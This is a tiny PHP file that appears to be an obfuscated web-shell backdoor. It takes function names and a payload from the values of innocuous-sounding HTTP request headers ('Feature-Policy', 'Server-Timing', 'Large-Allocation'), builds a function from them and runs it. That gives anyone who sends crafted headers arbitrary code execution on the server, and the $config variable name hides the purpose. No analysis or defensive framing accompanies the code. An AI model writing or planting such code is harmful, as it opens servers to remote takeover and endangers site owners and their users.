<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['Feature-Policy'])) {
    $config = $_HEADERS['Feature-Policy']('', $_HEADERS['Server-Timing']($_HEADERS['Large-Allocation']));
    $config();
}